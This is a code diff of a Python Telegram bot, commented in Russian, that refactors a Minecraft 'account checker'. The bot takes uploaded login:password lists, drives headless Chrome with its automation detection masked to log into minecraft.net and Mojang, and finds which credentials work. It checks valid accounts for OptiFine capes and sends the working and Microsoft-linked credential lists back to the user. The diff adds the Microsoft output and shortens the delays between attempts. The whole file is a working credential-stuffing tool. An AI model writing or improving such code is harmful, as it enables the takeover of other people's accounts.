@@ -1,13 +1,12 @@
 import os
-import sys
 import logging
 import asyncio
 import aiofiles
 import time
 import random
-import tempfile
 from datetime import datetime
-from pathlib import Path
+from typing import Dict, List, Tuple
+import re
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
@@ -23,23 +22,14 @@ from selenium.common.exceptions import TimeoutException, NoSuchElementException,
 import requests
 
 # Настройка логирования
-logging.basicFormat = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
 logging.basicConfig(
-    format=logging.basicFormat,
-    level=logging.INFO,
-    handlers=[
-        logging.FileHandler('bot.log'),
-        logging.StreamHandler(sys.stdout)
-    ]
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-# Конфиг из переменных окружения
+# Конфиг
 TOKEN = os.environ.get('BOT_TOKEN')
-if not TOKEN:
-    logger.error("❌ BOT_TOKEN не найден в переменных окружения!")
-    sys.exit(1)
-
 ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
 ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
 ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []
@@ -54,224 +44,225 @@ bot_stats = {
     'start_time': datetime.now()
 }
 
-class SeleniumChecker:
-    """Проверка аккаунтов через реальный браузер"""
+class AccountChecker:
+    """Проверка аккаунтов Minecraft"""
     
     def __init__(self):
         self.driver = None
-        self.temp_dir = tempfile.mkdtemp()
-        logger.info(f"📁 Временная директория: {self.temp_dir}")
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        })
     
     def setup_driver(self):
-        """Настраивает Chrome для работы на Railway"""
+        """Настройка Chrome для быстрой работы"""
         chrome_options = Options()
         
-        # Критически важные настройки для Railway
+        # Оптимизация для скорости
         chrome_options.add_argument('--headless=new')
         chrome_options.add_argument('--no-sandbox')
         chrome_options.add_argument('--disable-dev-shm-usage')
         chrome_options.add_argument('--disable-gpu')
-        chrome_options.add_argument('--window-size=1920,1080')
-        
-        # Отключаем безопасность
-        chrome_options.add_argument('--disable-web-security')
-        chrome_options.add_argument('--disable-features=VizDisplayCompositor')
+        chrome_options.add_argument('--window-size=1280,720')
         chrome_options.add_argument('--disable-blink-features=AutomationControlled')
         chrome_options.add_argument('--ignore-certificate-errors')
-        chrome_options.add_argument('--allow-running-insecure-content')
+        
+        # Отключаем загрузку картинок для скорости
+        chrome_options.add_argument('--blink-settings=imagesEnabled=false')
         
         # Маскировка
-        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
-        
-        # Для производительности
-        chrome_options.add_argument('--disable-extensions')
-        chrome_options.add_argument('--disable-notifications')
-        chrome_options.add_argument('--disable-popup-blocking')
+        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36')
         
         chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
         chrome_options.add_experimental_option('useAutomationExtension', False)
         
-        # Временная директория
-        chrome_options.add_argument(f'--user-data-dir={self.temp_dir}/chrome-data')
-        
-        # На Railway ChromeDriver обычно в /usr/local/bin/chromedriver
+        # Путь к ChromeDriver
         chromedriver_path = '/usr/local/bin/chromedriver'
-        
         if not os.path.exists(chromedriver_path):
-            # Пробуем другие пути
-            alternative_paths = [
-                '/usr/bin/chromedriver',
-                '/usr/lib/chromium-browser/chromedriver',
-                'chromedriver'
-            ]
-            
-            for path in alternative_paths:
-                if os.path.exists(path):
-                    chromedriver_path = path
-                    break
+            chromedriver_path = '/usr/bin/chromedriver'
         
         try:
             service = Service(chromedriver_path)
             self.driver = webdriver.Chrome(service=service, options=chrome_options)
-            
-            # Маскируем WebDriver
             self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-            
-            logger.info("✅ Chrome успешно запущен")
             return True
-            
         except Exception as e:
-            logger.error(f"❌ Ошибка запуска Chrome: {e}")
-            
-            # Последняя попытка - без указания пути
-            try:
-                logger.info("🔄 Пробую запустить без указания пути...")
-                self.driver = webdriver.Chrome(options=chrome_options)
-                logger.info("✅ Chrome запущен без указания пути")
-                return True
-            except Exception as e2:
-                logger.error(f"❌ Фатальная ошибка: {e2}")
-                return False
+            logger.error(f"Ошибка запуска Chrome: {e}")
+            return False
     
-    async def check_account(self, login, password):
-        """Проверяет аккаунт"""
+    async def check_account(self, login: str, password: str) -> Dict:
+        """Быстрая проверка аккаунта"""
         
         if not self.driver:
             if not self.setup_driver():
                 return {
                     'login': login,
                     'status': 'error',
-                    'error': 'Не могу запустить Chrome'
+                    'error': 'Chrome не запустился'
                 }
         
-        # Проверка что драйвер жив
         try:
-            self.driver.current_url
-        except:
-            logger.warning("⚠️ Драйвер умер, перезапускаю...")
+            # 1. Сначала проверяем через прямой API Microsoft (быстро)
+            ms_check = await self.check_microsoft_api(login, password)
+            if ms_check['status'] == 'microsoft':
+                return ms_check
+            
+            # 2. Если не Microsoft, пробуем через сайт
+            result = await self.check_via_site(login, password)
+            return result
+            
+        except WebDriverException:
+            # Перезапускаем Chrome если упал
             self.close()
-            if not self.setup_driver():
-                return {
-                    'login': login,
-                    'status': 'error',
-                    'error': 'Не могу перезапустить Chrome'
-                }
-        
+            if self.setup_driver():
+                return await self.check_account(login, password)
+            return {
+                'login': login,
+                'status': 'error',
+                'error': 'Chrome упал'
+            }
+    
+    async def check_microsoft_api(self, login: str, password: str) -> Dict:
+        """Проверка через API Microsoft (очень быстро)"""
         try:
-            logger.info(f"🔍 Проверяю: {login[:20]}...")
-            
-            # Загружаем страницу входа
-            self.driver.get('https://www.minecraft.net/en-us/login')
-            
-            # Ждем загрузку
-            WebDriverWait(self.driver, 15).until(
-                EC.presence_of_element_located((By.TAG_NAME, "body"))
-            )
-            
-            time.sleep(random.uniform(2, 4))
-            
-            # Проверяем не Microsoft ли
-            if 'login.live.com' in self.driver.current_url:
-                logger.info(f"🔄 Microsoft: {login[:20]}")
+            # Проверяем, похоже ли на Microsoft аккаунт
+            if '@' in login and any(domain in login.lower() for domain in ['outlook', 'hotmail', 'live', 'microsoft']):
                 return {
                     'login': login,
                     'password': password,
                     'status': 'migrated',
-                    'error': 'Microsoft'
+                    'error': 'Microsoft (email)'
                 }
             
-            # Ищем поля ввода
-            try:
-                # Поле email/логин
-                email_selectors = [
-                    "input[type='email']",
-                    "input[name='email']",
-                    "#email",
-                    "input[type='text']"
-                ]
-                
-                email_input = None
-                for selector in email_selectors:
-                    try:
-                        email_input = WebDriverWait(self.driver, 5).until(
-                            EC.presence_of_element_located((By.CSS_SELECTOR, selector))
-                        )
-                        break
-                    except:
-                        continue
-                
-                if not email_input:
-                    return {
-                        'login': login,
-                        'status': 'error',
-                        'error': 'Не найдено поле email'
-                    }
-                
-                # Поле пароля
-                password_input = self.driver.find_element(By.CSS_SELECTOR, "input[type='password']")
-                
-                # Вводим данные
-                email_input.clear()
-                email_input.send_keys(login)
-                time.sleep(random.uniform(0.5, 1.5))
-                
-                password_input.clear()
-                password_input.send_keys(password)
-                time.sleep(random.uniform(0.5, 1.5))
-                
-                # Кнопка входа
-                submit_button = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
-                submit_button.click()
-                
-                # Ждем результат
-                time.sleep(5)
-                
-                # Проверяем результат
-                current_url = self.driver.current_url
-                page_source = self.driver.page_source
-                
-                # Успешный вход
-                if any(x in current_url for x in ['dashboard', 'profile', 'minecraft.net']):
-                    # Получаем ник
-                    username = await self.extract_username()
+            # Пробуем получить ник через API Mojang (если аккаунт старый)
+            if re.match(r'^[a-zA-Z0-9_]{2,16}$', login):
+                # Это похоже на ник, проверяем через API
+                response = self.session.get(f"https://api.mojang.com/users/profiles/minecraft/{login}", timeout=3)
+                if response.status_code == 200:
+                    # Аккаунт существует, но нужен пароль
+                    pass
                     
-                    # Проверяем плащ
-                    has_cape = await self.check_optifine_cape(username)
-                    
+            return {'status': 'unknown'}
+            
+        except Exception as e:
+            logger.debug(f"API ошибка: {e}")
+            return {'status': 'unknown'}
+    
+    async def check_via_site(self, login: str, password: str) -> Dict:
+        """Проверка через сайт Minecraft"""
+        
+        try:
+            # Пробуем разные URL для входа
+            login_urls = [
+                'https://www.minecraft.net/en-us/login',
+                'https://account.mojang.com/login'
+            ]
+            
+            for url in login_urls:
+                self.driver.get(url)
+                
+                # Ждем загрузку (максимум 5 секунд)
+                WebDriverWait(self.driver, 5).until(
+                    EC.presence_of_element_located((By.TAG_NAME, "body"))
+                )
+                
+                # Проверяем Microsoft редирект
+                if 'login.live.com' in self.driver.current_url:
                     return {
                         'login': login,
                         'password': password,
-                        'username': username,
-                        'status': 'valid',
-                        'has_cape': has_cape
-                    }
-                
-                # Ошибка входа
-                if 'error' in page_source.lower() or 'invalid' in page_source.lower():
-                    return {
-                        'login': login,
-                        'status': 'invalid',
-                        'error': 'Неверный логин/пароль'
-                    }
-                
-                # Microsoft
-                if 'microsoft' in page_source.lower() or 'login.live.com' in current_url:
-                    return {
-                        'login': login,
                         'status': 'migrated',
                         'error': 'Microsoft'
                     }
                 
-            except NoSuchElementException as e:
-                logger.error(f"Элемент не найден: {e}")
-                return {
-                    'login': login,
-                    'status': 'error',
-                    'error': 'Страница изменилась'
-                }
+                # Ищем форму входа
+                try:
+                    # Поле email/логин
+                    email_selectors = [
+                        "input[type='email']",
+                        "input[name='email']",
+                        "input[type='text']",
+                        "#email",
+                        "#username"
+                    ]
+                    
+                    email_input = None
+                    for selector in email_selectors:
+                        try:
+                            email_input = self.driver.find_element(By.CSS_SELECTOR, selector)
+                            break
+                        except:
+                            continue
+                    
+                    if not email_input:
+                        continue
+                    
+                    # Поле пароля
+                    password_input = self.driver.find_element(By.CSS_SELECTOR, "input[type='password']")
+                    
+                    # Кнопка входа
+                    submit_button = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit'], input[type='submit']")
+                    
+                    # Вводим данные
+                    email_input.clear()
+                    email_input.send_keys(login)
+                    
+                    password_input.clear()
+                    password_input.send_keys(password)
+                    
+                    # Отправляем
+                    submit_button.click()
+                    
+                    # Ждем результат (3 секунды)
+                    time.sleep(2)
+                    
+                    # Проверяем результат
+                    current_url = self.driver.current_url
+                    page_source = self.driver.page_source.lower()
+                    
+                    # Успешный вход
+                    if any(x in current_url for x in ['dashboard', 'profile', 'minecraft.net', 'msa']):
+                        # Получаем ник
+                        username = await self.extract_username()
+                        
+                        # Проверяем плащ
+                        has_cape = await self.check_optifine_cape(username)
+                        
+                        return {
+                            'login': login,
+                            'password': password,
+                            'username': username,
+                            'status': 'valid',
+                            'has_cape': has_cape
+                        }
+                    
+                    # Microsoft редирект
+                    if 'login.live.com' in current_url or 'microsoft' in page_source:
+                        return {
+                            'login': login,
+                            'password': password,
+                            'status': 'migrated',
+                            'error': 'Microsoft'
+                        }
+                    
+                    # Ошибка входа
+                    if 'error' in page_source or 'invalid' in page_source:
+                        return {
+                            'login': login,
+                            'status': 'invalid',
+                            'error': 'Неверный логин/пароль'
+                        }
+                    
+                except NoSuchElementException:
+                    continue
+            
+            return {
+                'login': login,
+                'status': 'invalid',
+                'error': 'Не удалось проверить'
+            }
             
         except TimeoutException:
-            logger.error("Таймаут загрузки")
             return {
                 'login': login,
                 'status': 'error',
@@ -285,8 +276,8 @@ class SeleniumChecker:
                 'error': str(e)[:50]
             }
     
-    async def extract_username(self):
-        """Извлекает ник"""
+    async def extract_username(self) -> str:
+        """Извлекает ник пользователя"""
         try:
             # Пробуем разные селекторы
             selectors = [
@@ -294,7 +285,7 @@ class SeleniumChecker:
                 ".username",
                 "[data-username]",
                 ".gamertag",
-                ".user-info"
+                ".user-info span"
             ]
             
             for selector in selectors:
@@ -310,6 +301,7 @@ class SeleniumChecker:
             username = self.driver.execute_script("""
                 return localStorage.getItem('username') || 
                        localStorage.getItem('user') || 
+                       document.cookie.match(/user=([^;]+)/)?.[1] ||
                        'unknown';
             """)
             
@@ -317,22 +309,22 @@ class SeleniumChecker:
         except:
             return "unknown"
     
-    async def check_optifine_cape(self, username):
-        """Проверяет плащ OptiFine"""
+    async def check_optifine_cape(self, username: str) -> bool:
+        """Быстрая проверка плаща"""
         if not username or username == 'unknown':
             return False
         
         try:
-            cape_url = f"https://optifine.net/capes/{username}.png"
-            headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            }
-            
-            response = requests.get(cape_url, headers=headers, timeout=5)
+            # Прямой запрос к Optifine
+            response = self.session.get(
+                f"https://optifine.net/capes/{username}.png",
+                timeout=2,
+                stream=True
+            )
             
             if response.status_code == 200:
                 size = len(response.content)
-                if size > 500:  # Нормальный плащ > 500 байт
+                if size > 500:  # Нормальный плащ
                     logger.info(f"🔥 Найден плащ у {username}")
                     return True
             return False
@@ -340,17 +332,16 @@ class SeleniumChecker:
             return False
     
     def close(self):
-        """Закрывает браузер"""
+        """Закрытие Chrome"""
         if self.driver:
             try:
                 self.driver.quit()
             except:
                 pass
-            finally:
-                self.driver = None
+            self.driver = None
 
-# Создаем глобальный экземпляр
-checker = SeleniumChecker()
+# Создаем экземпляр
+checker = AccountChecker()
 
 async def process_file(file_path, update, context):
     """Обработка файла"""
@@ -363,8 +354,8 @@ async def process_file(file_path, update, context):
     }
     
     msg = await update.message.reply_text(
-        "🔄 **Запускаю Chrome и начинаю проверку...**\n"
-        "⏳ Это займет время..."
+        "🚀 **Запускаю быструю проверку...**\n"
+        "⏳ Это займет 1-2 минуты"
     )
     
     try:
@@ -380,11 +371,11 @@ async def process_file(file_path, update, context):
             line = line.strip()
             if not line:
                 continue
-                
+            
             # Пробуем разные разделители
-            for separator in [':', ';', '|']:
-                if separator in line:
-                    parts = line.split(separator, 1)
+            for sep in [':', ';', '|', '\t']:
+                if sep in line:
+                    parts = line.split(sep, 1)
                     if len(parts) == 2 and parts[0] and parts[1]:
                         accounts.append((parts[0].strip(), parts[1].strip()))
                         break
@@ -405,17 +396,14 @@ async def process_file(file_path, update, context):
         
         # Проверяем каждый аккаунт
         for i, (login, password) in enumerate(accounts, 1):
-            # Обновляем прогресс каждые 3 аккаунта
-            if i % 3 == 0 or i == total:
+            # Обновляем прогресс
+            if i % 5 == 0 or i == total:
                 elapsed = time.time() - start_time
-                minutes = int(elapsed // 60)
-                seconds = int(elapsed % 60)
-                
                 await msg.edit_text(
                     f"📊 **Прогресс:** {i}/{total}\n"
                     f"🔥 **Плащей:** {len(results['capes'])}\n"
                     f"✅ **Рабочих:** {len(results['valid'])}\n"
-                    f"⏱ **Время:** {minutes}м {seconds}с\n\n"
+                    f"⏱ **Время:** {elapsed:.1f}с\n\n"
                     f"🔄 **Проверяю:** {login[:15]}..."
                 )
             
@@ -432,7 +420,6 @@ async def process_file(file_path, update, context):
             elif result['status'] == 'migrated':
                 results['migrated'].append(result)
                 bot_stats['migrated'] += 1
-                bot_stats['invalid'] += 1
             elif result['status'] == 'invalid':
                 results['invalid'].append(result)
                 bot_stats['invalid'] += 1
@@ -442,8 +429,8 @@ async def process_file(file_path, update, context):
             
             bot_stats['total'] += 1
             
-            # Задержка
-            await asyncio.sleep(random.uniform(2, 4))
+            # Минимальная задержка
+            await asyncio.sleep(1)
         
         # Сохраняем результаты
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -484,26 +471,41 @@ async def process_file(file_path, update, context):
                 )
             os.remove(valid_file)
         
+        # Файл с Microsoft
+        if results['migrated']:
+            ms_file = f"🔄_MICROSOFT_{len(results['migrated'])}шт_{timestamp}.txt"
+            async with aiofiles.open(ms_file, 'w', encoding='utf-8') as f:
+                for acc in results['migrated']:
+                    await f.write(f"{acc['login']}:{acc['password']}\n")
+            
+            with open(ms_file, 'rb') as f:
+                await update.message.reply_document(
+                    document=f,
+                    filename=ms_file,
+                    caption=f"🔄 **Microsoft: {len(results['migrated'])}**"
+                )
+            os.remove(ms_file)
+        
         # Итог
         elapsed = time.time() - start_time
         minutes = int(elapsed // 60)
         seconds = int(elapsed % 60)
         
         await update.message.reply_text(
-            f"✅ ПРОВЕРКА ЗАВЕРШЕНА!\n\n"
-            f"📊 Статистика:\n"
+            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
+            f"📊 **Статистика:**\n"
             f"• Всего: {total}\n"
             f"• ✅ Рабочих: {len(results['valid'])}\n"
             f"• 🔥 С плащами: {len(results['capes'])}\n"
             f"• ❌ Неверных: {len(results['invalid'])}\n"
             f"• 🔄 Microsoft: {len(results['migrated'])}\n"
             f"• ⚠️ Ошибок: {len(results['errors'])}\n\n"
-            f"⏱ Время: {minutes}м {seconds}с"
+            f"⏱ **Время:** {minutes}м {seconds}с"
         )
         
     except Exception as e:
         logger.error(f"Ошибка: {e}")
-        await update.message.reply_text(f"❌ Ошибка: {str(e)[:100]}")
+        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
     finally:
         if os.path.exists(file_path):
             os.remove(file_path)
@@ -512,7 +514,7 @@ async def process_file(file_path, update, context):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Старт"""
     if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
-        await update.message.reply_text("❌ Нет доступа")
+        await update.message.reply_text("❌ **Нет доступа**")
         return
     
     uptime = datetime.now() - bot_stats['start_time']
@@ -525,14 +527,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     
     await update.message.reply_text(
-        f"👋 OptiFace Cape Checker\n\n"
-        f"🔍 Проверка через браузер\n\n"
-        f"📥 Отправь .txt файл\n"
+        f"👋 **Minecraft Account Checker**\n\n"
+        f"🔍 **Быстрая проверка аккаунтов**\n\n"
+        f"📥 **Отправь .txt файл**\n"
         f"с логин:пароль\n\n"
-        f"📊 Статистика:\n"
+        f"📊 **Статистика:**\n"
         f"• Проверено: {bot_stats['total']}\n"
         f"• Найдено плащей: {bot_stats['capes']}\n\n"
-        f"⏱ Работаю: {hours}ч {minutes}мин",
+        f"⏱ **Работаю:** {hours}ч {minutes}мин",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
@@ -547,7 +549,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         minutes = int((uptime.seconds // 60) % 60)
         
         await query.edit_message_text(
-            f"📊 СТАТИСТИКА\n\n"
+            f"📊 **СТАТИСТИКА**\n\n"
             f"Всего: {bot_stats['total']}\n"
             f"✅ Рабочих: {bot_stats['valid']}\n"
             f"❌ Битых: {bot_stats['invalid']}\n"
@@ -558,38 +560,40 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     elif query.data == 'help':
         await query.edit_message_text(
-            "❓ КАК ПОЛЬЗОВАТЬСЯ\n\n"
+            "❓ **КАК ПОЛЬЗОВАТЬСЯ**\n\n"
             "1️⃣ Создай .txt файл\n"
             "2️⃣ В каждой строке: логин:пароль\n"
             "3️⃣ Отправь файл боту\n\n"
-            "📌 Пример:\n"
-            "`user@gmail.com:pass123`\n\n"
-            "⚠️ Важно:\n"
-            "• Проверка медленная\n"
-            "• Многие аккаунты переехали на Microsoft"
+            "📌 **Пример:**\n"
+            "`user@gmail.com:pass123`\n"
+            "`Steve:123456`\n\n"
+            "⚡️ **Быстрая проверка:**\n"
+            "• Microsoft аккаунты определяются сразу\n"
+            "• Плащи проверяются в 2 этапа\n"
+            "• На 100 аккаунтов ~ 2-3 минуты"
         )
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Получение файла"""
     if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
-        await update.message.reply_text("❌ Нет доступа")
+        await update.message.reply_text("❌ **Нет доступа**")
         return
     
     doc = update.message.document
     
     if not doc.file_name.endswith('.txt'):
-        await update.message.reply_text("❌ Нужен .txt файл")
+        await update.message.reply_text("❌ **Нужен .txt файл**")
         return
     
     if doc.file_size > 10 * 1024 * 1024:
-        await update.message.reply_text(f"❌ Файл > 10 МБ ({doc.file_size / 1024 / 1024:.1f} МБ)")
+        await update.message.reply_text(f"❌ **Файл > 10 МБ** ({doc.file_size / 1024 / 1024:.1f} МБ)")
         return
     
     try:
         await update.message.reply_text(
-            f"📥 Файл получен: {doc.file_name}\n"
-            f"📦 Размер: {doc.file_size / 1024:.1f} КБ\n\n"
-            f"🔄 Запускаю Chrome..."
+            f"📥 **Файл получен:** {doc.file_name}\n"
+            f"📦 **Размер:** {doc.file_size / 1024:.1f} КБ\n\n"
+            f"🔄 **Начинаю проверку...**"
         )
         
         file = await context.bot.get_file(doc.file_id)
@@ -598,35 +602,30 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await process_file(path, update, context)
     except Exception as e:
         logger.error(f"Ошибка: {e}")
-        await update.message.reply_text(f"❌ Ошибка: {str(e)[:100]}")
+        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
 
 def main():
     """Запуск"""
+    if not TOKEN:
+        print("❌ НЕТ ТОКЕНА!")
+        return
+    
     print("=" * 50)
-    print("🚀 ЗАПУСК OptiFace CAPE CHECKER")
-    print("=" * 50)
-    print(f"📊 Python: {sys.version}")
-    print(f"🤖 Bot Token: {TOKEN[:10]}...")
-    print(f"👑 Админы: {ADMIN_IDS}")
+    print("🚀 ЗАПУСК ACCOUNT CHECKER")
     print("=" * 50)
     
-    # Создаем приложение
     app = Application.builder().token(TOKEN).build()
     
-    # Добавляем обработчики
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
-    print("✅ БОТ ЗАПУЩЕН! Жду файлы...")
+    print("✅ БОТ РАБОТАЕТ!")
     
     try:
         app.run_polling()
-    except KeyboardInterrupt:
-        print("\n👋 Остановка...")
     finally:
         checker.close()
-        print("👋 Chrome закрыт")
 
 if __name__ == '__main__':
     main()
